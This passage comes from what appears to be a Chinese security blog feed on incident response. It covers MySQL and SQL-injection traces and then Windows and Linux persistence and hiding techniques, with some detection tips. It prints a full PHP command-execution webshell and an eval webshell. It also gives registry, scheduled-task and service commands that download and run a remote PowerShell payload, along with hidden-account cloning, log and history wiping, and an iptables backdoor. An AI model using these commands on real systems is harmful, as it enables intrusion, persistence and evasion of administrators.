-nr</span><br><span class="line">     13 mysql</span><br><span class="line">     12 root</span><br><span class="line">      1 root</span><br><span class="line">      1 mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p><p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p><h3 id="0x03-SQL注入入侵痕迹"><a href="#0x03-SQL注入入侵痕迹" class="headerlink" title="0x03  SQL注入入侵痕迹"></a>0x03  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="/image/media/2022/secops/log-5-3.png"></p><p>创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p><p>tmpbwyov.php：</p><?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?><p>`</p><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、检查网站目录下，是否存在一些木马文件：</p><p><img src="/image/media/2022/secops/log-5-4.png"></p><p>2、检查是否有UDF提权、MOF提权痕迹</p><p>检查目录是否有异常文件</p><p>mysql\lib\plugin </p><p>c:/windows/system32/wbem/mof/</p><p>检查函数是否删除</p><p><code>select * from mysql.func</code></p><p>3、结合web日志分析。</p>]]></content>
      
      
      <categories>
          
          <category> 安全运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应之权限维持</title>
      <link href="/article/2022-07-01-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/article/2022-07-01-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<p>学习一下应急响应之权限维持。</p><span id="more"></span><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="Windows权限维持–隐藏篇"><a href="#Windows权限维持–隐藏篇" class="headerlink" title="Windows权限维持–隐藏篇"></a>Windows权限维持–隐藏篇</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>攻击者在获取服务器权限后，通常会用一些后门来维持权限，如果你想让你的后门保持的更久些，那么请隐藏好它，使之不易被管理员发现。</p><h3 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h3><p><strong>1、利用文件属性</strong></p><p>最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件里看不到刚刚的文件了。</p><p><img src="/image/media/2022/secops/privilege-1-1.png"></p><p>如果要让文件显示出来，就点击查看，勾选显示隐藏的文件，文件就显示出来。</p><p><img src="/image/media/2022/secops/privilege-1-2.png"></p><p>如何真正隐藏文件？</p><p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p><p><code>attrib +s +a +h +r  D:\test\project\test</code>.txt</p><p>这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。</p><p>破解隐藏文件：</p><p>打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p><p><img src="/image/media/2022/secops/privilege-1-3.png"></p><p><strong>2、利用ADS隐藏文件内容</strong></p><p>​    在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞： 　</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @eval($_POST[&#x27;chopper&#x27;]);?^&gt; &gt; index.php:hidden.jpg</span><br></pre></td></tr></table></figure><p>这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。　</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">问题1：如何查看index.php:hidden.jpg内容呢？</span><br><span class="line"></span><br><span class="line">　　进入文件所在目录，notepad index.php:hidden.jpg    或者 dir /r</span><br><span class="line">　　</span><br><span class="line">问题2：如何删除index.php:hidden.jpg？</span><br><span class="line"></span><br><span class="line">     直接删除index.php即可</span><br></pre></td></tr></table></figure><p><strong>3、驱动级文件隐藏</strong></p><p>驱动隐藏我们可以用过一些软件来实现，软件名字叫：Easy File Locker      </p><p>下载链接： <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p><p>如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c:\WINDOWS\xlkfs.dat</span><br><span class="line">c:\WINDOWS\xlkfs.dll</span><br><span class="line">c:\WINDOWS\xlkfs.ini</span><br><span class="line">c:\WINDOWS\system32\drivers\xlkfs.sys</span><br></pre></td></tr></table></figure><p>那么你，应该是遭遇了驱动级文件隐藏。</p><p>如何清除？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、查询服务状态： sc qc xlkfs</span><br><span class="line">2、停止服务： net stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现</span><br><span class="line">3、删除服务： sc delete xlkfs</span><br><span class="line">4、删除系统目录下面的文件，重启系统，确认服务已经被清理了。</span><br></pre></td></tr></table></figure><p>隐藏文件的方式还有很多，比如伪装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。</p><p>这些隐藏文件的方式早已不再是秘密，而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现。</p><h3 id="0x02-隐藏账号"><a href="#0x02-隐藏账号" class="headerlink" title="0x02 隐藏账号"></a>0x02 隐藏账号</h3><p>window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。</p><p><img src="/image/media/2022/secops/privilege-1-4.png"></p><p>PS:CMD命令行使用”net user”,看不到”test$”这个账号，但在控制面板和本地用户和组是可以显示此用户的。</p><p>克隆账号制作过程：</p><p>1、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。</p><p><img src="/image/media/2022/secops/privilege-1-5.png"></p><p>2、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。</p><p><img src="/image/media/2022/secops/privilege-1-6.png"></p><p>3、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。</p><p><img src="/image/media/2022/secops/privilege-1-7.png"></p><p>4、分别test$和“000003EC导出到桌面，删除test$用户   net user test$ /del</p><p><img src="/image/media/2022/secops/privilege-1-8.png"></p><p>5、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的，只有在注册表中才能看得到。</p><p>检测和清理方法：</p><p>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。</p><p><img src="/image/media/2022/secops/privilege-1-9.png"></p><h3 id="0x03-端口复用"><a href="#0x03-端口复用" class="headerlink" title="0x03 端口复用"></a>0x03 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Window下，如何实现端口复用呢？</p><p>前阵子，@Twi1ight公布了一种基于内置系统服务的端口复用后门方法，利用WinRM服务，一条命令实现端口复用后门：</p><p><code>winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</code></p><p>一般开启WinRM服务作为远程管理，但还是第一次听到可以作为端口复用，一种简单容易实现的端口复用方式。假设，攻击者已获取到administrator账号密码，连接远程WinRM服务执行命令：</p><p><img src="/image/media/2022/secops/privilege-1-19.png"></p><p>当执行这条命令的同时，将在安全日志中留下痕迹，</p><p><img src="/image/media/2022/secops/privilege-1-20.png"></p><p>另外，可以通过代码实现端口复用重定向，工具：<a href="https://github.com/crabkun/Switcher">https://github.com/crabkun/Switcher</a></p><h3 id="0x04-进程注入"><a href="#0x04-进程注入" class="headerlink" title="0x04 进程注入"></a>0x04 进程注入</h3><p>进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。在常见的渗透测试框架中，进程注入是怎么做的以及我们如何通过工具排查出来？</p><p><strong>1、meterpreter会话注入</strong></p><p>当前权限无法获取hash值，查看目前系统进程</p><p><img src="/image/media/2022/secops/privilege-1-10.png"></p><p>通过migrate将进程注入到system进程后，成功获得hash值。</p><p><img src="/image/media/2022/secops/privilege-1-11.png"></p><p>Window后门排查：</p><p>通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。 </p><p><img src="/image/media/2022/secops/privilege-1-12.png"></p><p><strong>2、Empire会话进程注入</strong></p><p>通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。如下图：</p><p><img src="/image/media/2022/secops/privilege-1-13.png"></p><p>Window后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。</p><p><img src="/image/media/2022/secops/privilege-1-14.png"></p><p><img src="/image/media/2022/secops/privilege-1-15.png"></p><p><strong>3、Cobalt Strike进程注入</strong></p><p>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。</p><p><img src="/image/media/2022/secops/privilege-1-16.png"></p><p><img src="/image/media/2022/secops/privilege-1-17.png"></p><p>Window后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。</p><p><img src="/image/media/2022/secops/privilege-1-18.png"></p><h3 id="0x05-结束"><a href="#0x05-结束" class="headerlink" title="0x05  结束"></a>0x05  结束</h3><p>本文主要介绍了Window下的几种隐藏技术，包括隐藏文件、隐藏账号、端口复用、进程注入等方面的简单实现及其排查技巧。仅作抛砖引玉之用，欢迎留言分享。</p><h2 id="Windows权限维持–后门篇"><a href="#Windows权限维持–后门篇" class="headerlink" title="Windows权限维持–后门篇"></a>Windows权限维持–后门篇</h2><p>关键词：Windows系统后门、权限维持</p><p>在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者便如入无人之境。本文将对常见的window服务端自启动后门技术进行解析，知己知彼方能杜绝后门。</p><h3 id="0x01-注册表自启动"><a href="#0x01-注册表自启动" class="headerlink" title="0x01 注册表自启动"></a><strong>0x01 注册表自启动</strong></h3><p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p><p>常用的注册表启动键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Run键 </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line"># Winlogon\Userinit键</span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon</span><br><span class="line"></span><br><span class="line">类似的还有很多,关键词：注册表启动键值。</span><br></pre></td></tr></table></figure><p>使用以下命令可以一键实现无文件注册表后门：</p><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.142:8888/logo.gif&#39;))\&quot;&quot; /f</code></p><p><strong>Logon Scripts 后门</strong></p><p>注册表路径：HKEY_CURRENT_USER\Environment\</p><p>创建字符串键值：  UserInitMprLogonScript，键值设置为bat的绝对路径：<code>c:\test.bat</code></p><p><strong>userinit后门</strong></p><p>在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。</p><p>利用USERINIT注册表键实现无文件后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br><span class="line"> </span><br><span class="line">&quot;Userinit&quot;=&quot;C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="0x02-组策略设置脚本启动"><a href="#0x02-组策略设置脚本启动" class="headerlink" title="0x02 组策略设置脚本启动"></a><strong>0x02 组策略设置脚本启动</strong></h3><p>运行gpedit.msc进入本地组策略，通过Windows设置的“脚本(启动/关机)”项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p><p><img src="/image/media/2022/secops/privilege-4-3.png"></p><p>容易遇到的问题：脚本需全路径，如<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe </code></p><h3 id="0x03-计划任务"><a href="#0x03-计划任务" class="headerlink" title="0x03 计划任务"></a><strong>0x03 计划任务</strong></h3><p>通过window系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p><p>使用以下命令可以一键实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /sc minute /mo 1 /tn &quot;Security Script&quot; /tr &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&quot;\&quot;\&quot;http://192.168.28.142:8888/logo.gif\&quot;\&quot;\&quot;))\&quot;&quot;</span><br></pre></td></tr></table></figure><p>容易遇到的问题：cmd命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p><p>计划脚本每 1 分钟运行一次。</p><p><img src="/image/media/2022/secops/privilege-4-4.png"></p><h3 id="0x04-服务自启动"><a href="#0x04-服务自启动" class="headerlink" title="0x04 服务自启动"></a><strong>0x04 服务自启动</strong></h3><p>通过服务设置自启动，结合powershell实现无文件后门。</p><p>使用以下命令可实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc create &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\&quot;&quot;</span><br><span class="line"></span><br><span class="line">sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class="line">sc config Name start= auto                //设置这个服务为自动启动</span><br><span class="line">net start Name                            //启动服务</span><br></pre></td></tr></table></figure><p>成功创建了一个自启动服务</p><p><img src="/image/media/2022/secops/privilege-4-5.png"></p><h3 id="0x05-WMI后门"><a href="#0x05-WMI后门" class="headerlink" title="0x05 WMI后门"></a><strong>0x05 WMI后门</strong></h3><p>在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。这里可以利用一个工具powersploit，下面用它的Persistence模块来示范一个简单的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Persistence\Persistence.psm1</span><br><span class="line">$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At &#x27;3 PM&#x27;</span><br><span class="line">$UserOptions = New-UserPersistenceOption -Registry -AtLogon</span><br><span class="line">Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose</span><br></pre></td></tr></table></figure><h3 id="0x06-dll劫持"><a href="#0x06-dll劫持" class="headerlink" title="0x06 dll劫持"></a><strong>0x06 dll劫持</strong></h3><p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一 个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。</p><p>比较常用的如LPK.dll的劫持：</p><p>win7及win7以上系统增加了KnownDLLs保护，需要在注册表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</span><br></pre></td></tr></table></figure><p>下添加 “lpk.dll” 才能顺利劫持：</p><p><img src="/image/media/2022/secops/privilege-4-6.png"></p><h3 id="0x07-COM劫持"><a href="#0x07-COM劫持" class="headerlink" title="0x07 COM劫持"></a><strong>0x07 COM劫持</strong></h3><p>利用COM劫持技术，最为关键的是dll的实现以及CLSID的选择，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。这种方法可以绕过Autoruns对启动项的检测。</p><p><img src="/image/media/2022/secops/privilege-4-7.png"></p><h3 id="0x08-远程控制"><a href="#0x08-远程控制" class="headerlink" title="0x08 远程控制"></a><strong>0x08 远程控制</strong></h3><p>远控木马是一种恶意程序，其中包括在目标计算机上用于管理控制的后门。远程访问木马通常与用户请求的程序（如游戏程序）一起，是一种看不见的下载，或作为电子邮件附件发送。一旦主机系统被攻破，入侵者可以利用它来向其他易受感染的计算机分发远程访问木马，从而建立僵尸网络。</p><p>一般分为客户端和服务端，如：灰鸽子、上兴远控、梦想时代、QuasarRAT等。</p><p><img src="/image/media/2022/secops/privilege-4-8.png"></p><p><strong>0x09 结束语</strong></p><p>未知攻焉知防，本文分享了几种Window下的自动启权限维持技术。管理员在平时运维过程应当保持警惕，掌握一定的入侵排查技巧，及时进行系统补丁更新，定期对服务器安全检查，才能有效地预防后门。</p><h2 id="Linux权限维持–隐藏篇"><a href="#Linux权限维持–隐藏篇" class="headerlink" title="Linux权限维持–隐藏篇"></a>Linux权限维持–隐藏篇</h2><h3 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p><h3 id="0x01-隐藏文件-1"><a href="#0x01-隐藏文件-1" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h3><p>Linux 下创建一个隐藏文件：<code>touch  .test.txt</code>  </p><p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p><p><img src="/image/media/2022/secops/privilege-2-1.png"></p><p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p><p>这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p><h3 id="0x02-隐藏文件时间戳"><a href="#0x02-隐藏文件时间戳" class="headerlink" title="0x02 隐藏文件时间戳"></a>0x02 隐藏文件时间戳</h3><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p><p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p><p>利用方法</p><p>touch -r index.php webshell.php</p><p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p><p>touch -t 1401021042.30 webshell.php</p><h3 id="0x03-隐藏权限"><a href="#0x03-隐藏权限" class="headerlink" title="0x03 隐藏权限"></a>0x03 隐藏权限</h3><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p><p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php 锁定文件</span><br><span class="line">lsattr  evil.php   属性查看</span><br><span class="line">chattr -i evil.php 解除锁定</span><br><span class="line">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-2-2.png"></p><h3 id="0x04-隐藏历史操作命令"><a href="#0x04-隐藏历史操作命令" class="headerlink" title="0x04 隐藏历史操作命令"></a>0x04 隐藏历史操作命令</h3><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p><p>技巧一：只针对你的工作关闭历史记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[space]set +o history</span><br><span class="line">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure><p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p><p>要重新开启历史功能，执行下面的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]set -o history</span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure><p>技巧二：从历史记录中删除指定的命令</p><p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | grep &quot;keyword&quot;</span><br></pre></td></tr></table></figure><p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -d [num]</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-2-3.png"></p><p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure><h3 id="0x05-隐藏远程SSH登陆记录"><a href="#0x05-隐藏远程SSH登陆记录" class="headerlink" title="0x05 隐藏远程SSH登陆记录"></a>0x05 隐藏远程SSH登陆记录</h3><p>#隐身登录系统，不会被w、who、last等指令检测到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1 /bin/bash -i</span><br></pre></td></tr></table></figure><p>不记录ssh公钥在本地.ssh目录中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br></pre></td></tr></table></figure><h3 id="0x06-端口复用"><a href="#0x06-端口复用" class="headerlink" title="0x06 端口复用"></a>0x06 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p><p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#安装SSLH</span><br><span class="line">sudo apt-get install sslh</span><br><span class="line">#配置SSLH</span><br><span class="line">编辑 SSLH 配置文件：</span><br><span class="line">sudo vi /etc/default/sslh</span><br><span class="line">1、找到下列行：Run=no  将其修改为：Run=yes</span><br><span class="line">2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443</span><br><span class="line">DAEMON_OPTS=&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;</span><br></pre></td></tr></table></figure><p>第二种方式：利用IPTables进行端口复用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 端口复用链</span><br><span class="line">iptables -t nat -N LETMEIN</span><br><span class="line"># 端口复用规则</span><br><span class="line">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class="line"># 开启开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#x27;threathuntercoming&#x27; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class="line"># 关闭开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#x27;threathunterleaving&#x27; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class="line"># let&#x27;s do it</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启复用</span><br><span class="line">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class="line">#ssh使用80端口进行登录</span><br><span class="line">ssh -p 80 root@192.168.28.128</span><br><span class="line">#关闭复用</span><br><span class="line">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-2-4.png"></p><p> 具体文章详见：<a href="https://www.freebuf.com/articles/network/137683.html">远程遥控 IPTables 进行端口复用</a></p><h3 id="0x07-进程隐藏"><a href="#0x07-进程隐藏" class="headerlink" title="0x07 进程隐藏"></a>0x07 进程隐藏</h3><p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p><p>第一种方法：libprocesshider</p><p>github项目地址：<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p><p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone 